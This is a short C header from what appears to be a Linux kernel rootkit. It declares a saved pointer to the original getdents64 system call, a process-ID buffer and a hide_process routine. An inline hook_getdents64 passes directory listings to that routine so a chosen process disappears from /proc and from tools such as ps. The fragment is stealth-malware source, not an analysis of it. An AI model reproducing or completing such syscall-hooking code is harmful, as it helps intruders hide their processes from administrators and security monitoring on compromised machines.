#include <linux/version.h>

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0))
#define PTREGS 1
#endif

extern char proc_pid[255];

#ifdef PTREGS
extern long (*orig_getdents64)(const struct pt_regs *);
long hide_process(const struct pt_regs *regs,
                  struct linux_dirent64 __user *dirp);

static inline long hook_getdents64(const struct pt_regs *regs) {
  return hide_process(regs, ((struct linux_dirent64 *)regs->si));
}
#endif
